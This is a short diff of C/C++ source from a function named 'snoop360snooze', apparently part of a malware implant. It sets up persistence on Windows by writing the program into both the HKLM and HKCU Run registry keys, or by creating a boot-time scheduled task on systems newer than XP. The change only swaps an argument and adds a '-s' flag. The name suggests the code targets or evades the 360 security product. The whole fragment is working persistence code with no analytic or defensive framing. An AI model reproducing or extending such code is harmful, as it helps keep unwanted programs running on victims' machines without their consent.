@@ -405,9 +405,9 @@ DWORD __stdcall snoop360snooze()
 
 				if (iSystemVersion <= SYSTEM_VERSION_XP)
 				{
-					int iRet = SetBootForRegRun(HKEY_LOCAL_MACHINE, strPEResidence);
+					int iRet = SetBootForRegRun(HKEY_LOCAL_MACHINE, strPEResParam);
 
-					iRet = SetBootForRegRun(HKEY_CURRENT_USER, strPEResidence);
+					iRet = SetBootForRegRun(HKEY_CURRENT_USER, strPEResParam);
 					if (iRet == 0)
 					{
 						writeLog(" windows xp SetBootForRegRun error\r\n");
@@ -419,11 +419,11 @@ DWORD __stdcall snoop360snooze()
 				}
 				else
 				{
-					int iRet = createBootTask(SCHEDULE_RUN_MIN_INTERVAL, LITTLEBEARNAME, strPEResidence, "", iSystemVersion);
+					int iRet = createBootTask(SCHEDULE_RUN_MIN_INTERVAL, LITTLEBEARNAME, strPEResidence, "-s", iSystemVersion);
 
-					iRet = SetBootForRegRun(HKEY_CURRENT_USER, strPEResidence);
+					iRet = SetBootForRegRun(HKEY_CURRENT_USER, strPEResParam);
 
-					iRet = SetBootForRegRun(HKEY_LOCAL_MACHINE, strPEResidence);
+					iRet = SetBootForRegRun(HKEY_LOCAL_MACHINE, strPEResParam);
 				}
 
 				saveProgram();
